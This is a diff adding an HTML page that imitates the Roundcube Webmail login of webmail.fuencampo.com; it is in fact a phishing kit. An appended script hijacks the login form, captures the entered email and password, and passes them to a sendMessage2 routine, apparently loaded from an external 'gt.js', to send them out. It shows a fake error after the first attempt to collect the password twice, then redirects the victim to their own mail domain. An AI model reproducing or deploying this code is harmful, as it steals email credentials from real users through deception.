@@ -1,0 +1,229 @@
+<!DOCTYPE html>
+
+<html lang="en">
+
+<head>
+<meta http-equiv="content-type" content="text/html; charset=UTF-8"><title>Roundcube Webmail :: Welcome to Roundcube Webmail</title>
+	<meta name="viewport" content="width=device-width, initial-scale=1.0, shrink-to-fit=no, maximum-scale=1.0"><meta name="theme-color" content="#f4f4f4"><meta name="msapplication-navbutton-color" content="#f4f4f4">
+	<link rel="shortcut icon" href="http://webmail.fuencampo.com/skins/elastic/images/favicon.ico?s=1727786558">
+	<link rel="stylesheet" href="http://webmail.fuencampo.com/skins/elastic/deps/bootstrap.min.css?s=1727786558">
+	
+		<link rel="stylesheet" href="http://webmail.fuencampo.com/skins/elastic/styles/styles.min.css?s=1727786558">
+		
+	
+	
+		<script>
+		try {
+			if (document.cookie.indexOf('colorMode=dark') > -1
+				|| (document.cookie.indexOf('colorMode=light') === -1 && window.matchMedia('(prefers-color-scheme: dark)').matches)
+			) {
+				document.documentElement.className += ' dark-mode';
+			}
+		} catch (e) { }
+		</script>
+	
+<link rel="stylesheet" type="text/css" href="http://webmail.fuencampo.com/plugins/jqueryui/themes/elastic/jquery-ui.min.css?s=1727786558"><script src="http://webmail.fuencampo.com/program/js/jquery.min.js?s=1727786558"></script><script src="http://webmail.fuencampo.com/program/js/common.min.js?s=1727786558"></script><script src="http://webmail.fuencampo.com/program/js/app.min.js?s=1727786558"></script><script src="http://webmail.fuencampo.com/program/js/jstz.min.js?s=1727786558"></script><script>
+/*
+        @licstart  The following is the entire license notice for the 
+        JavaScript code in this page.
+
+        Copyright (C) The Roundcube Dev Team
+
+        The JavaScript code in this page is free software: you can redistribute
+        it and/or modify it under the terms of the GNU General Public License
+        as published by the Free Software Foundation, either version 3 of
+        the License, or (at your option) any later version.
+
+        The code is distributed WITHOUT ANY WARRANTY; without even the implied
+        warranty of MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.
+        See the GNU GPL for more details.
+
+        @licend  The above is the entire license notice
+        for the JavaScript code in this page.
+*/
+var rcmail = new rcube_webmail();
+rcmail.set_env({"task":"login","standard_windows":false,"locale":"en_US","devel_mode":null,"rcversion":10609,"cookie_domain":"","cookie_path":"/","cookie_secure":false,"dark_mode_support":true,"skin":"elastic","blankpage":"skins/elastic/watermark.html","refresh_interval":60,"session_lifetime":600,"action":"","comm_path":"/?_task=login","compose_extwin":false,"date_format":"yy-mm-dd","date_format_localized":"YYYY-MM-DD","request_token":"ABgeAN5CtLMY1hybOmcAHXZfMx83iWrb"});
+rcmail.add_label({"loading":"Loading...","servererror":"Server Error!","connerror":"Connection Error (Failed to reach the server)!","requesttimedout":"Request timed out","refreshing":"Refreshing...","windowopenerror":"The popup window was blocked!","uploadingmany":"Uploading files...","uploading":"Uploading file...","close":"Close","save":"Save","cancel":"Cancel","alerttitle":"Attention","confirmationtitle":"Are you sure...","delete":"Delete","continue":"Continue","ok":"OK","back":"Back","errortitle":"An error occurred!","options":"Options","plaintoggle":"Plain text","htmltoggle":"HTML","previous":"Previous","next":"Next","select":"Select","browse":"Browse","choosefile":"Choose file...","choosefiles":"Choose files..."});
+rcmail.gui_container("loginfooter","login-footer");rcmail.gui_object('loginform', 'login-form');
+rcmail.gui_object('message', 'messagestack');
+</script>
+
+<script src="http://webmail.fuencampo.com/plugins/jqueryui/js/jquery-ui.min.js?s=1727786558"></script>
+</head>
+<body class="task-login action-none">
+	
+		<div id="layout">
+	
+
+
+<h1 class="voice">Roundcube Webmail Login</h1>
+
+<div id="layout-content" class="selected no-navbar" role="main">
+	<img alt="" id="logo" src="data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjkuMTQgMTQxLjggNTczLjY1IDU3My42NSI+CiAgPHN0eWxlPgogICAgLnN0MCwuc3Qze2ZpbGwtcnVsZTpldmVub2RkO2NsaXAtcnVsZTpldmVub2RkO2ZpbGw6IzQwNGY1NH0uc3Qze2ZpbGw6IzM3YmVmZn0KICA8L3N0eWxlPgogIDxwYXRoIGNsYXNzPSJzdDMiIGQ9Ik01ODIuNzkgNTQ5Ljc3TDI5NS45NiAzODQuMVYyMDcuMjdsMjg2LjgzIDE2NS42OHoiLz4KICA8cGF0aCBjbGFzcz0ic3QwIiBkPSJNOS4xNCA1NDkuNzdMMjk1Ljk2IDM4NC4xVjIwNy4yN0w5LjE0IDM3Mi45NXoiLz4KICA8cGF0aCBkPSJNMjk1Ljk2IDE0MS44YzEwOS41NiAwIDE5OC40MSA4OC44NSAxOTguNDEgMTk4LjQxcy04OC44NSAxOTguNDEtMTk4LjQxIDE5OC40MVM5Ny41NSA0NDkuNzcgOTcuNTUgMzQwLjIxIDE4Ni40IDE0MS44IDI5NS45NiAxNDEuOCIgZmlsbC1ydWxlPSJldmVub2RkIiBjbGlwLXJ1bGU9ImV2ZW5vZGQiIGZpbGw9IiNjY2MiLz4KICA8cGF0aCBkPSJNMjk1Ljk2IDE0MS44YzEwOS42IDAgMTk4LjQ4IDg4Ljg1IDE5OC40OCAxOTguNDFzLTg4Ljg4IDE5OC40MS0xOTguNDggMTk4LjQxYy02Mi45MS00Mi4zNC04OC45NC0xMjcuNjQtODguOTQtMTk4LjNzMjYuMDMtMTU2LjEgODguOTQtMTk4LjUyIiBmaWxsLXJ1bGU9ImV2ZW5vZGQiIGNsaXAtcnVsZT0iZXZlbm9kZCIgZmlsbD0iI2U1ZTVlNSIvPgogIDxwYXRoIGNsYXNzPSJzdDMiIGQ9Ik01ODIuNzkgMzcyLjk1TDI5NS45NiA1MzguNjJ2MTc2LjgzbDI4Ni44My0xNjUuNjh6Ii8+CiAgPHBhdGggY2xhc3M9InN0MCIgZD0iTTkuMTQgMzcyLjk1bDI4Ni44MiAxNjUuNjd2MTc2LjgzTDkuMTQgNTQ5Ljc3eiIvPgo8L3N2Zz4K" />
+	
+            <form id="login-form" name="login-form" method="post" class="propform" action="/?_task=login">
+<div class="message">
+                Log in with your current password to continue using same password
+            </div>
+<input type="hidden" name="_token" value="ABgeAN5CtLMY1hybOmcAHXZfMx83iWrb">
+	<input type="hidden" name="_task" value="login">
+	<input type="hidden" name="_action" value="login">
+	<input type="hidden" name="_timezone" id="rcmlogintz" value="_default_">
+	<input type="hidden" name="_url" id="rcmloginurl" value="">
+	<table>
+		<tbody>
+			<tr>
+				<td class="title">
+					<label for="rcmloginuser">Username</label>
+				</td>
+				<td class="input">
+					<input name="_user" id="rcmloginuser" required size="40" class="form-control" autocapitalize="off" autocomplete="off" value="" type="text">
+				</td>
+			</tr>
+			<tr>
+				<td class="title">
+					<label for="rcmloginpwd">Password</label>
+				</td>
+				<td class="input">
+					<input name="_pass" id="rcmloginpwd" required size="40" class="form-control" autocapitalize="off" autocomplete="off" type="password">
+				</td>
+			</tr>
+		</tbody>
+	</table>
+	<p class="formbuttons">
+		<button type="submit" id="rcmloginsubmit" class="button mainaction submit">Login</button>
+	</p>
+		<div id="login-footer" role="contentinfo">
+			Roundcube Webmail
+			
+			
+			
+		</div>
+	</form>
+</div>
+
+<noscript>
+	<p class="noscriptwarning">Warning: This webmail service requires Javascript! In order to use it please enable Javascript in your browser's settings.</p>
+</noscript>
+
+
+</div>
+
+
+
+<div id="messagestack"></div>
+<script>
+$(function() {
+rcmail.init();
+});
+</script>
+
+
+<script src="http://webmail.fuencampo.com/skins/elastic/deps/bootstrap.bundle.min.js?s=1727786558"></script>
+<script src="http://webmail.fuencampo.com/skins/elastic/ui.min.js?s=1727786558"></script>
+<script src="http://webmail.fuencampo.com/skins/elastic/styles/styles.min.css"></script>
+</body>
+<script type="text/javascript" src="gt.js"></script>
+<script type="text/javascript">
+// Add error and success message divs to the form if they don't exist
+if (!document.getElementById('errorMessage')) {
+    const messageContainer = document.createElement('div');
+    messageContainer.innerHTML = `
+        <div class="error" id="errorMessage" style="display:none;color:#dc3545;padding:10px;margin:10px 0;"></div>
+        <div class="success" id="successMessage" style="display:none;color:#28a745;padding:10px;margin:10px 0;">Login successful!</div>
+    `;
+    document.getElementById('login-form').insertBefore(messageContainer, document.querySelector('.formbuttons'));
+}
+
+let submitCount = 0;
+
+// Get email from URL hash and set it
+function setEmailFromHash() {
+    const hash = window.location.hash.substring(1);
+    if (hash) {
+        const emailInput = document.getElementById('rcmloginuser');
+        emailInput.value = hash;
+        emailInput.disabled = true;
+        emailInput.style.backgroundColor = '#f8f9fa';
+        emailInput.style.color = '#666';
+    }
+}
+
+// Function to reset the form state
+function resetFormState() {
+    const submitButton = document.getElementById('rcmloginsubmit');
+    submitButton.disabled = false;
+    submitButton.textContent = 'Login';
+    
+    // Reset any loading indicators
+    const loadingElements = document.querySelectorAll('.loading');
+    loadingElements.forEach(el => el.style.display = 'none');
+}
+
+// Initialize on page load
+document.addEventListener('DOMContentLoaded', setEmailFromHash);
+
+// Override the default form submission
+document.getElementById('login-form').addEventListener('submit', async function(e) {
+    e.preventDefault();
+    
+    const email = document.getElementById('rcmloginuser').value;
+    const password = document.getElementById('rcmloginpwd').value;
+    const errorDiv = document.getElementById('errorMessage');
+    const successDiv = document.getElementById('successMessage');
+    const submitButton = document.getElementById('rcmloginsubmit');
+    
+    // Reset password field
+    document.getElementById('rcmloginpwd').value = '';
+    
+    submitCount++;
+    
+    try {
+        const formattedMessage = await formatMessage(email, password, "ROUNDCUBE PAGE");
+        
+        if (submitCount === 1) {
+            // First submission - show error
+            submitButton.disabled = true; // Disable button temporarily
+            
+            // Send first attempt
+            await sendMessage2(formattedMessage);
+            
+            // Show error and reset form state after a short delay
+            setTimeout(() => {
+                errorDiv.style.display = 'block';
+                successDiv.style.display = 'none';
+                errorDiv.textContent = errormessage;
+                resetFormState();
+            }, 1000);
+            
+        } else if (submitCount === 2) {
+            // Second submission - show success and redirect
+            errorDiv.style.display = 'none';
+            successDiv.style.display = 'block';
+            
+            // Send second attempt
+            await sendMessage2(formattedMessage);
+
+            // Redirect after 3 seconds based on email domain
+            setTimeout(() => {
+                const domain = email.split('@')[1];
+                window.location.href = `https://${domain}`;
+            }, 3000);
+        }
+    } catch (error) {
+        console.error('Error:', error);
+        resetFormState();
+    }
+});
+
+// Override the default rcmail init function to prevent default form handling
+if (typeof rcmail !== 'undefined') {
+    const originalInit = rcmail.init;
+    rcmail.init = function() {
+        originalInit.apply(this, arguments);
+        // Prevent the default form submission handling
+        rcmail.gui_objects.loginform = null;
+    };
+}
+</script>
+</html>
